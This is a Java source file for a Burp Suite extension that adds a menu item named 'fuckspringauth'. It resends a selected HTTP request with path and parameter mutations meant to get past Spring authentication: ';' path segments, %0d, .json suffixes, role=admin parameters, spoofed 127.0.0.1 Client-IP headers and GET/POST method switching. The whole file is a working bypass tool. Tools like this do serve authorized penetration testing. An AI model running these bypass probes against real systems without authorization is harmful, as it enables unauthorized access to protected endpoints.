package extension;

import burp.api.montoya.MontoyaApi;
import burp.api.montoya.http.message.HttpHeader;
import burp.api.montoya.http.message.HttpRequestResponse;
import burp.api.montoya.http.message.responses.HttpResponse;
import burp.api.montoya.ui.contextmenu.ContextMenuEvent;
import burp.api.montoya.ui.contextmenu.ContextMenuItemsProvider;
import java.awt.*;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.CompletableFuture;
import javax.swing.*;

public class MyContextMenustest implements ContextMenuItemsProvider {
    private final MontoyaApi api;

    public MyContextMenustest(MontoyaApi api) {
        this.api = api;
    }

    @Override
    public List<Component> provideMenuItems(ContextMenuEvent event) {
        List<Component> menus = new ArrayList<>();
        JMenuItem TestJMenuItem = new JMenuItem("fuckspringauth");
        TestJMenuItem.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent e) {
                api.logging().logToOutput("starting working");
                HttpRequestResponse requestResponse = getSelectedHttpRequestResponse(event);
                if (requestResponse != null) {
                    String nowurlpath = requestResponse.request().path();
                    List<String> allurlpaths = varyurls(nowurlpath);
                    sendlist(allurlpaths, requestResponse);
                } else {
                    api.logging().logToError("The request is not selected correctly");
                }
            }
        });
        menus.add(TestJMenuItem);
        return menus;
    }

    public void sendlist(List<String> allurlpaths, HttpRequestResponse requestResponse) {
        SwingWorker<Void, String> worker = new SwingWorker<Void, String>() {
            @Override
            protected Void doInBackground() {
                for (String path : allurlpaths) {
                    CompletableFuture<HttpResponse> future = (CompletableFuture<HttpResponse>) api.http().sendRequest(requestResponse.request().withPath(path));
                    try {
                        HttpResponse response = future.get(); // 等待响应
                        handleResponse(response, path);
                    } catch (Exception e) {
                        api.logging().logToError("Failed to get response: " + e.getMessage());
                    }
                    publish(path);  // 如果需要更新 UI，可以使用 publish
                }

                CompletableFuture<HttpResponse> finalRequestFuture = (CompletableFuture<HttpResponse>) api.http().sendRequest(
                        requestResponse.request()
                                .withHeader(HttpHeader.httpHeader("Base-Url", "127.0.0.1"))
                                .withHeader(HttpHeader.httpHeader("Base-Url", "127.0.0.1"))
                                .withHeader(HttpHeader.httpHeader("Client-IP", "127.0.0.1"))
                );

                try {
                    HttpResponse finalResponse = finalRequestFuture.get(); // 等待响应
                    handleResponse(finalResponse, "Final Request");
                } catch (Exception e) {
                    api.logging().logToError("Failed to get final response: " + e.getMessage());
                }

                if (!requestResponse.request().method().toString().equals("GET")) {
                    CompletableFuture<HttpResponse> postRequestFuture = (CompletableFuture<HttpResponse>) api.http().sendRequest(
                            requestResponse.request().withMethod("POST")
                    );
                    try {
                        HttpResponse postResponse = postRequestFuture.get(); // 等待响应
                        handleResponse(postResponse, "POST Request");
                    } catch (Exception e) {
                        api.logging().logToError("Failed to get POST response: " + e.getMessage());
                    }
                }

                if (!requestResponse.request().method().toString().equals("POST")) {
                    CompletableFuture<HttpResponse> getRequestFuture = (CompletableFuture<HttpResponse>) api.http().sendRequest(
                            requestResponse.request().withMethod("GET")
                    );
                    try {
                        HttpResponse getResponse = getRequestFuture.get(); // 等待响应
                        handleResponse(getResponse, "GET Request");
                    } catch (Exception e) {
                        api.logging().logToError("Failed to get GET response: " + e.getMessage());
                    }
                }

                return null;
            }

            private void handleResponse(HttpResponse response, String requestDescription) {
                int statusCode = response.statusCode();
                if (statusCode == 200) {
                    api.logging().logToOutput("Response for " + requestDescription + " is 200");
                } else {
                    api.logging().logToError("Response for " + requestDescription + " is not 200: " + statusCode);
                }
            }

            @Override
            protected void process(List<String> chunks) {
                // 这里可以更新 UI，比如显示已处理的路径
                for (String path : chunks) {
                    // 处理 UI 更新
                }
            }

            @Override
            protected void done() {
                try {
                    get(); // 检查是否有异常
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
        };
        worker.execute();
    }

    private HttpRequestResponse getSelectedHttpRequestResponse(ContextMenuEvent event) {
        // 获取当前选中的 HttpRequestResponse 对象
        return event.messageEditorRequestResponse().isPresent()
                ? event.messageEditorRequestResponse().get().requestResponse()
                : event.selectedRequestResponses().isEmpty() ? null : event.selectedRequestResponses().get(0);
    }

    private List<String> varyurls(String urlpath) {
        List<String> allurlpaths = new ArrayList<>();
        if (!urlpath.isEmpty()) {
            api.logging().logToOutput(urlpath);

            // 1. 最后一个目录加上 /
            String withTrailingSlash = urlpath.replaceAll("([^/?]+)(\\?.*)?$", "$1/$2");
            allurlpaths.add(withTrailingSlash);

            // 2. 最后一个目录加上 .json
            String withJson = urlpath.replaceAll("([^/?]+)(\\?.*)?$", "$1.json$2");
            allurlpaths.add(withJson);

            // 3. 最后一个目录加上 .111
            String with111 = urlpath.replaceAll("([^/?]+)(\\?.*)?$", "$1.111$2");
            allurlpaths.add(with111);

            if (!urlpath.contains("?")) {
                String withId = urlpath + "?id=1";
                allurlpaths.add(withId);
            }
            if (!urlpath.contains("?")) {
                String roleid = urlpath + "?role=1";
                allurlpaths.add(roleid);
            }
            if (!urlpath.contains("?")) {
                String roletype = urlpath + "?roleType=admin";
                allurlpaths.add(roletype);
            }

            // 5. 最后一个目录加上 /%0d
            String withCR = urlpath.replaceAll("([^/?]+)(\\?.*)?$", "$1%0d$2");
            allurlpaths.add(withCR);

            // 7. 一个一个 / 变为 /;/
            for (int i = 0; i < urlpath.length(); i++) {
                if (urlpath.charAt(i) == '/') {
                    String modifiedPath = urlpath.substring(0, i) + "/;" + urlpath.substring(i);
                    allurlpaths.add(modifiedPath);
                }
            }
            // 8. 一个一个 / 变成 //;//
            for (int i = 0; i < urlpath.length(); i++) {
                if (urlpath.charAt(i) == '/') {
                    String modifiedPath = urlpath.substring(0, i) + "//;/" + urlpath.substring(i);
                    allurlpaths.add(modifiedPath);
                }
            }
            api.logging().logToOutput(allurlpaths.toString());
        } else {
            api.logging().logToError("The url is empty");
        }
        return allurlpaths;
    }
}
